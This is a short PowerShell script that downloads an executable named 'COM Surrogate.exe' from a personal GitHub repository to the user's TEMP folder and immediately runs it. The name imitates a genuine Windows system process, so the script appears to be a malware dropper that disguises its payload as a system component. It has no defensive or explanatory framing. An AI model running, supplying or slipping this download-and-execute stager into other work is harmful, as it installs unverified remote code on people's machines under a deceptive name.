# Define the URL of the file to download
$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"

# Define the local path where the file will be saved
$output = "$env:TEMP\COM_Surrogate.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Check if the file was downloaded successfully
if (Test-Path $output) {
    # Execute the downloaded file
    Start-Process -FilePath $output
} else {
    Write-Host "Failed to download the file."
}

